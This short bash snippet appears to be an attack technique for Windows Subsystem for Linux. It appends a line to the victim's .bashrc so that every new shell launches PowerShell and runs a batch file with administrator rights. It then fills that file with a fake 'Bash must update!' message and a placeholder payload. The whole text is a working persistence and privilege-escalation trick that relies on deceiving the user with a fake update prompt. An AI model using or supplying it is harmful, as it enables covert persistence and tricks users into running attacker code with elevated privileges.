bash
echo " /mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -Command \"Start-Process c:\users\victim\BashUpdate.bat -Verb RunAs\"" >> .bashrc
exit
echo Bash must update! > BashUpdate.bat
echo yourPayload > BashUpdate.bat
